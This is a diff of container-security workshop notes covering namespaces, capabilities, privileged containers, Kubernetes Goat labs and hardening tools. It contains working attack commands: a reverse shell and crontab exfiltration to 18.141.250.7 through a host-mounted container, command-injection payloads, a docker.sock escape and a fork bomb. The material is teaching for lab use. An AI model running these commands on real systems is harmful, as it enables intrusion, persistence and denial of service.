@@ -1,40 +1,24 @@
 # container-security-workshop-notes
 
-## Agenda
-
-1. Kubernetes misconfiguration attacks
-2. Docker attacks, if any
-3. Attack surface in comparision to monolithic applications
-4. Docker security tips
-5. Tools for hardening docker
-6. How to secure it? Dockerfile
-7. Hardening dockerfiles
-8. Resources to Kubernetes tips
-9. 
-
-## Rough outline
+## Notes
 
 ### Sample attacks & hacks across the globe
 
-Kubernetes hacks doesn't have to be just a misconfiguration in kubernetes. Any vulnerability in the applications running on Kubernetes can also lead to compromise of the entire system. A few hacks are referenced below:
+Kubernetes hacks doesn't have to be just a misconfiguration in kubernetes. Any vulnerability in the applications running on top of Kubernetes lead to entire system compromise. A few hacks:
 
-<!-- Demo of how security hacks are done!
-shodan + script (hide) + enumeration + recon + live hacking (scope) -->
-
-https://www.bleepingcomputer.com/news/security/over-900-000-kubernetes-instances-found-exposed-online/
-https://www.wired.com/story/cryptojacking-tesla-amazon-cloud/
-https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/
-https://sysdig.com/blog/exposed-prometheus-exploit-kubernetes-kubeconeu/
-https://thehackernews.com/2022/05/yes-containers-are-terrific-but-watch.html
-https://www.trendmicro.com/vinfo/es/security/news/cybercrime-and-digital-threats/tesla-and-jenkins-servers-fall-victim-to-cryptominers
-https://thehackernews.com/2022/07/over-1200-npm-packages-found-involved.html
-https://threatpost.com/380k-kubernetes-api-servers-exposed-to-public-internet/179679/
-https://www.bleepingcomputer.com/news/security/jenkins-discloses-dozens-of-zero-day-bugs-in-multiple-plugins/
-
+* https://www.bleepingcomputer.com/news/security/over-900-000-kubernetes-instances-found-exposed-online/
+* https://www.wired.com/story/cryptojacking-tesla-amazon-cloud/
+* https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/
+* https://sysdig.com/blog/exposed-prometheus-exploit-kubernetes-kubeconeu/
+* https://thehackernews.com/2022/05/yes-containers-are-terrific-but-watch.html
+* https://www.trendmicro.com/vinfo/es/security/news/cybercrime-and-digital-threats/tesla-and-jenkins-servers-fall-victim-to-cryptominers
+* https://thehackernews.com/2022/07/over-1200-npm-packages-found-involved.html
+* https://threatpost.com/380k-kubernetes-api-servers-exposed-to-public-internet/179679/
+* https://www.bleepingcomputer.com/news/security/jenkins-discloses-dozens-of-zero-day-bugs-in-multiple-plugins/
 
 ### Live session on how it's done
 
-Everyday you see many hacks happening on the internet but you might not be sure how it happens. I will show a demonstration on how it's done!
+Everyday you see many hacks happening on the internet but you might not be sure how it happens. I will show a demonstration on how it's done end-to-end!
 
 shodan.io
 
@@ -46,21 +30,35 @@ You can use their developer guide to write scripts to scrape the data, etc.
 
 https://github.com/JavierOlmedo/shodan-filters
 
+https://www.shodan.io/host/65.0.72.126
+
+
+You can use tools like https://github.com/xmendez/wfuzz or simple bash scripts to brute force the username & password
+
+Most popular username & password dump: https://github.com/danielmiessler/SecLists
+
+
 https://github.com/weaveworks/scope
 
-https://github.com/danielmiessler/SecLists
-
-apk add docker
+```bash
 apk add libcap
 capsh --print
+```
 
-You can run privileged containers, containers with hostpid, hostipc, etc. You can gain access to the host machine, run things around, run crypto miners silently in the background, etc.
+```bash
+find / -name docker.sock
+apk add docker
+```
 
-Or leverage capablities like  CAP_SYS_ADMIN, CAP_SYS_MODULE, CAP_SYS_RAWIO, CAP_NET_ADMIN, etc.
+We can run privileged containers, containers with hostpid, hostipc, etc. We can gain access to the host machine, run things around, run crypto miners silently in the background, and lot more. We can even leverage capablities like CAP_SYS_ADMIN, CAP_SYS_MODULE, CAP_SYS_RAWIO, CAP_NET_ADMIN, etc.
 
-You can also use tools like `nsenter` to create namespaces in linux
+You can also use tools like `nsenter` to create namespaces in linux or even hook into one of the parent processes running on the host & break out of the container
 
-How to know if you are inside a container or on a host machine?
+```bash
+which nsenter
+```
+
+How to know if we are inside a container or on a host machine?
 
 ```bash
 ls -l /var/lib/docker
@@ -72,7 +70,11 @@ docker run --rm -it -v /:/abcd ubuntu bash
 # hostname
 ```
 
-Let's leverage the functionality of cronjob in linux to get a reverse shell
+Let's leverage the functionality of cronjob in linux to get a reverse shell. Few techniques to get a reverse shell are given here: https://highon.coffee/blog/reverse-shell-cheat-sheet/
+
+
+![Reverse shell](https://miro.medium.com/max/1400/1*CyVqkmA7wLYaippCGRXW5w.jpeg)
+Reference: https://systemweakness.com/a-persistent-reverse-shell-on-macos-40fb65b3dacf?gi=70e6704f4f9e
 
 ```bash
 docker run --rm -it -v /:/abcd ubuntu bash
@@ -81,6 +83,7 @@ docker run --rm -it -v /:/abcd ubuntu bash
 # echo "bash -i >& /dev/tcp/18.141.250.7/8888 0>&1" > /abcd/tmp/run.sh
 # chmod +x /abcd/tmp/run.sh
 # echo "*  *    * * *   root    bash /tmp/run.sh" >> /abcd/etc/crontab
+# echo '*  *    * * *   root    curl 18.141.250.7:8000/test/$(hostname)' >> /abcd/etc/crontab
 ```
 
 On `18.141.250.7`, wait for incoming connection
@@ -91,53 +94,87 @@ nc -nlvp 8888
 
 ### Attack Mitre framework
 
-We cannot discuss all stages in one session. We will try to touch one topic from each section mentioned below!
-
 ![https://images.contentstack.io/v3/assets/blt300387d93dabf50e/blt79d91d9e7404f336/629d981961670f0fb5dd1161/MITTRE_ATTACK_Metric.png](https://images.contentstack.io/v3/assets/blt300387d93dabf50e/blt79d91d9e7404f336/629d981961670f0fb5dd1161/MITTRE_ATTACK_Metric.png)
+Reference: https://www.weave.works/blog/mitre-attack-matrix-for-kubernetes
 
-https://www.weave.works/blog/mitre-attack-matrix-for-kubernetes
+We cannot discuss all stages in one session. We will try to touch one topic from each category. But first we must learn about containers!
 
 ### Container?
 
+Isolation in the same system with unique namespaces - PID, User, Mount, Net, UTS, IPC, Cgroup
+
 https://github.com/rewanthtammana/containers-from-scratch/blob/master/main.go#L32
+
+```bash
+docker run --rm -it ubuntu bash
+# sleep 1d
+```
+
+```bash
+ps -ef | grep sleep 1d
+ls /proc/<PID>/ns
+```
+
+You can see the docker container namespaces! In real all the data, processes, etc are existing on the host machine.
+
+```bash
+docker run --name debugcontainer --rm -it ubuntu bash
+# echo "inside container" > file.txt
+```
+
+```bash
+docker inspect debugcontainer | grep -i upperdir
+```
+
+In `docker inspect`, you will see the below fields.
+
+`LowerDir`: contains the files of the base system
+`UpperDir`: all changes to the base system are stored in `upperDir` 
+
+```bash
+docker inspect debugcontainer | grep -i upperdir
+cat <upperdir>/file.txt
+```
+
+Viola! The file you created inside the container is accessible from the host machine.
 
 ### What does it mean to be root inside a container?
 
-You can run these on Killercoda!
+You can run these on killercoda!
 
-Root on host machine & root inside container
+**Root on host machine & root inside container**
 
 ```bash
 $ docker run --rm -it nginx bash
 # sleep 1d
-$ ps -ef | grep sleep
 ```
-
-Non-root on host machine & root inside container
 
 ```bash
-$ su - ubuntu
-$ sudo chown ubuntu:ubuntu /var/run/docker.sock
-$ docker run --rm -it nginx bash
-# sleep 2d
 $ ps -ef | grep sleep
 ```
 
-Root on host machine & non-root inside container
+**Non-root on host machine & root inside container**
+
+```bash
+$ adduser ubuntu
+$ sudo chown ubuntu:ubuntu /var/run/docker.sock
+$ su - ubuntu
+$ docker run --rm -it nginx bash
+# sleep 2d
+```
+
+```bash
+$ ps -ef | grep sleep
+```
+
+**Root on host machine & non-root inside container**
 
 ```bash
 $ docker run --rm --user 1000:1000 -it nginx bash
 # sleep 3d
-$ ps -ef | grep sleep
 ```
 
-Non-root on host machine & non-root inside container
-
 ```bash
-$ su - ubuntu
-$ sudo chown ubuntu:ubuntu /var/run/docker.sock
-$ docker run --rm --user ${UID}:${UID} -it nginx bash
-# sleep 4d
 $ ps -ef | grep sleep
 ```
 
@@ -155,15 +192,16 @@ docker run --rm -it -v /tmp/groot.txt:/tmp/groot.txt nginx cat /tmp/groot.txt
 docker run --rm -it -u 1000:1000 -v /tmp/groot.txt:/tmp/groot.txt nginx cat /tmp/groot.txt
 ```
 
-
+When the user inside the container is non-root, even if the container gets compromised, the attacker cannot read the mounted sensitive files unless they have the appropriate permissions or escalate the privileges.
 
 ### Privileged container
 
-Let's see if we can change the host file permissions from a privileged container
+Kernel files are crucial on host machine, let's see if we can mess with that.
 
 https://github.com/torvalds/linux/blob/v5.0/Documentation/sysctl/vm.txt#L809
 
 ```bash
+$ cat /proc/sys/vm/swappiness
 $ docker run --rm --privileged -it ubuntu bash
 # cat /proc/sys/vm/swappiness
 60
@@ -171,17 +209,26 @@ $ docker run --rm --privileged -it ubuntu bash
 $ cat /proc/sys/vm/swappiness
 ```
 
-These kind of changes to the kernel can create DoS attacks!
+These kind of changes to the kernel files can create DoS attacks!
 
+Let's say you got access to one of the containers by exploiting an application or some other means. How will you identify if you are inside a privileged or normal container? There are many ways! A few of them are!
 
-How to identify if a container is privileged or normal? There are many ways!
+Run two containers, one normal & one privileged
+
+```bash
+docker run --rm -it ubuntu bash
+docker run --rm --privileged -it ubuntu bash
+```
 
 1. Check for mount permissions & masking
     ```bash
     mount | grep 'ro,'
     mount | grep /proc.*tmpfs
     ```
-1. Linux capablities
+1. Linux capablities - we will see more about it in the next section!
+    ```bash
+    capsh --print
+    ```
 1. Seccomp - Limit the syscalls
     ```bash
     grep Seccomp /proc/1/status
@@ -205,53 +252,50 @@ capsh --decode=<decodeBnd>
 Demonstrating that the processes inside the container inherits it's capabilities
 
 ```bash
-$ docker run --rm -it ubuntu bash
-# sleep 1d
+$ docker run --rm -it ubuntu sleep 1d &
 $ ps aux | grep sleep
 $ grep Cap /proc/<pid>/status
 $ capsh --decode=<value>
 ```
 
 ```bash
-$ docker run --rm --privileged -it ubuntu bash
-# sleep 1d
+$ docker run --rm --privileged -it ubuntu sleep 2d &
 $ ps aux | grep sleep
 $ grep Cap /proc/<pid>/status
 $ capsh --decode=<value>
 ```
 
 ```bash
-$ docker run --rm --cap-drop=all -it ubuntu bash
-# sleep 1d
+$ docker run --rm --cap-drop=all -it ubuntu sleep 3d &
 $ ps aux | grep sleep
 $ grep Cap /proc/<pid>/status
 $ capsh --decode=<value>
 ```
 
-CapEff: The effective capability set represents all capabilities the process is using at the moment.
+**CapEff:** The effective capability set represents all capabilities the process is using at the moment.
 
-CapPrm: The permitted set includes all capabilities a process may use.
+**CapPrm:** The permitted set includes all capabilities a process may use.
 
-CapInh: Using the inherited set all capabilities that are allowed to be inherited from a parent process can be specified.
+**CapInh:** Using the inherited set all capabilities that are allowed to be inherited from a parent process can be specified.
 
-CapBnd: With the bounding set its possible to restrict the capabilities a process may ever receive.
+**CapBnd:** With the bounding set its possible to restrict the capabilities a process may ever receive.
 
-CapAmb: The ambient capability set applies to all non-SUID binaries without file capabilities.
+**CapAmb:** The ambient capability set applies to all non-SUID binaries without file capabilities.
 
-CAP_CHOWN - allows the root use to make arbitrary changes to file UIDs and GIDs
+About a few capabilities:
 
-CAP_DAC_OVERRIDE - allows the root user to bypass kernel permission checks on file read, write and execute operations.
+**CAP_CHOWN** - allows the root use to make arbitrary changes to file UIDs and GIDs
 
-CAP_SYS_ADMIN - Most powerful capability. It allows to manage cgroups of the system, thereby allowing you to control system resources
+**CAP_DAC_OVERRIDE** - allows the root user to bypass kernel permission checks on file read, write and execute operations.
+
+**CAP_SYS_ADMIN** - Most powerful capability. It allows to manage cgroups of the system, thereby allowing you to control system resources
 
 ```bash
-$ docker run --rm -it ubuntu bash
-# ping google.com
+docker run --rm -it busybox:1.28 ping google.com
 ```
 
 ```bash
-$ docker run --rm --cap-drop=NET_RAW -it ubuntu bash
-# ping google.com
+docker run --rm --cap-drop=NET_RAW -it busybox:1.28 ping google.com
 ```
 
 ```bash
@@ -268,7 +312,9 @@ https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docke
 
 We got multiple scenarios in Kubernetes Goat. So, we can do a hands-on session on those scenarios.
 
-https://github.com/madhuakula/kubernetes-goat
+Run it on your local machine/cloud instance. For multiple reasons, killercoda isn't working with this project!
+
+If you have Kubernetes, run the below commands!
 
 ```bash
 git clone https://github.com/madhuakula/kubernetes-goat.git
@@ -279,16 +325,48 @@ watch -n 0.1 kubectl get po
 bash access-kubernetes-goat.sh
 ```
 
-http://127.0.0.1:1231/
+If you are on KinD, then
 
 ```bash
+git clone https://github.com/madhuakula/kubernetes-goat.git
+cd kubernetes-goat/platforms/kind-setup
+bash setup-kind-cluster-and-goat.sh
+# Wait for a while to get all services up & running
+watch -n 0.1 kubectl get po
+bash access-kubernetes-goat.sh
+```
+
+DIND (docker-in-docker) exploitation - http://127.0.0.1:1231/
+
+On your cloud instance, get ready to catch the reverse shell!
+
+![Reverse shell](https://miro.medium.com/max/1400/1*CyVqkmA7wLYaippCGRXW5w.jpeg)
+Reference: https://systemweakness.com/a-persistent-reverse-shell-on-macos-40fb65b3dacf?gi=70e6704f4f9e
+
+```bash
+nc -nlvp 8888
+```
+
+
+```bash
+127.0.0.1
+127.0.0.1;id
+127.0.0.1;whoami
+127.0.0.1;hostname
+127.0.0.1;ls -l
 # Get a reverse shell to ease the enumeration
 127.0.0.1;echo "bash -i >& /dev/tcp/18.141.250.7/8888 0>&1" > /tmp/run.sh;cat /tmp/run.sh
 # echo "bash -i >& /dev/tcp/18.141.250.7/8888 0>&1" > /tmp/run.sh
 127.0.0.1;chmod +x /tmp/run.sh;bash /tmp/run.sh
+```
+
+
+```bash
+nc -nlvp 8888
+# you will get a shell here
 # look for ambiguiencies in the files
 find / -name docker.sock
-apt update #But this is taking lots of time for some reason. So, we cannot install docker directly!
+apt update #But this is taking lots of time for some reason. So, we cannot install docker with apt commands!
 # Download docker binary directly to save the time
 wget https://download.docker.com/linux/static/stable/x86_64/docker-17.03.0-ce.tgz
 tar xvf docker-17.03.0-ce.tgz
@@ -333,9 +411,12 @@ trivy i nginx
 
 Since, you have learnt argocd. I will teach you how to fix issues in argocd!
 
+This will not work on killercoda due to disk space constraints, use your local machine to try it!
+
 ```bash
 git clone https://github.com/argoproj/argo-cd
-# Some error due to BUILDPLATFORM, so just remove it!
+cd argo-cd
+# Errors due to BUILDPLATFORM specification, just remove it from the Dockerfile!
 docker build . -t argocd
 trivy i argocd
 ```
@@ -397,10 +478,10 @@ bash access-kubernetes-goat.sh
 ```bash
 kubectl get jobs
 kubectl get jobs hidden-in-layers -oyaml
+dive madhuakula/k8s-goat-hidden-in-layers
 docker save madhuakula/k8s-goat-hidden-in-layers -o hidden-in-layers.tar
 tar -xvf hidden-in-layers.tar
-# Find the ID
-# Identify the ID
+# Find the layer ID
 cd <ID>
 tar -xvf layers.tar
 cat <whatever-it-is>
@@ -408,7 +489,7 @@ cat <whatever-it-is>
 
 ### DoSing the container - Fork bomb
 
-**DO NOT RUN IN ON YOUR COMPUTER EVER**
+**DO NOT RUN IN ON YOUR COMPUTER EVER. RUN IN KILLERCODA ONLY**
 
 ```bash
 :(){ :|:& };:
@@ -417,12 +498,12 @@ cat <whatever-it-is>
 We will do this on killercoda! Get ready to crash your system.
 
 ```bash
-docker run --name nolimits --rm -it ubuntu bash
-docker stats nolimits
+docker run --name unlimited --rm -it ubuntu bash
+docker stats unlimited
 ```
 
 ```bash
-docker run --name withlimits --rm -m 1Gi --cpus 0.8 -it ubuntu bash
+docker run --name withlimits --rm -m 0.5Gi --cpus 0.8 -it ubuntu bash
 docker stats withlimits
 ```
 
@@ -430,12 +511,15 @@ docker stats withlimits
 
 Another scenario is kubernetes goat!
 
+Attacking private registry - http://127.0.0.1:1235
+
 You can use tools like dirbuster/gobuster to brute force the list of pages
 
 https://docs.docker.com/registry/spec/api/
 
+
 ```bash
-URL="whatever"
+URL="http://127.0.0.1:1235"
 curl $URL/v2/
 # List all repositories
 curl $URL/v2/_catalog
@@ -449,7 +533,7 @@ curl $URL/v2/madhuakula/k8s-goat-users-repo/manifests/latest | grep -i env
 
 https://github.com/goodwithtech/dockle
 
-Installation
+**Installation**
 
 ```bash
 VERSION=$(
@@ -489,7 +573,6 @@ docker run --name nginx --rm -it -d nginx
 docker exec -it nginx bash
 cat /etc/shadow
 ```
-
 
 https://github.com/developer-guy/awesome-falco
 
